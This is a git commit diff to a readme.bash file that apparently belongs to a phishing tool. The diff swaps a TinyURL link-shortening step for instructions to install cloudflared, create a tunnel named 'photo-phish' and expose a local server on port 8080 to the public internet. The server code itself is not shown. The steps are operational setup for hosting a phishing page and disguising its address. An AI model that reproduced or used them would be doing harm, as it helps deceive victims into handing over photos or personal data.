980d14ba0d08864fd9481c771fc5a4da0dcede31
VIP_IN <vipkum05@gmail.com>
2026-02-22 00:20:44 +0530

    Update readme.bash

--- readme.bash
+++ readme.bash
@@ -6,5 +6,24 @@ chmod +x server.py
 python3 server.py
 
 
-# Using curl + tinyurl (or deploy your own)
-curl -d "url=http://your-server.com" "http://tinyurl.com/api-create.php"
+FOR CLOUDFLARE LINK 
+
+# Ubuntu/Debian
+wget https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64.deb
+sudo dpkg -i cloudflared-linux-amd64.deb
+
+# OR Mac
+brew install cloudflared
+
+# OR Windows (PowerShell)
+winget install Cloudflare.cloudflared
+
+#login here
+cloudflared tunnel login
+
+#host 
+# Terminal 2 - Create tunnel
+cloudflared tunnel create photo-phish
+
+# Run tunnel (copies public URL automatically!)
+cloudflared tunnel --url http://localhost:8080
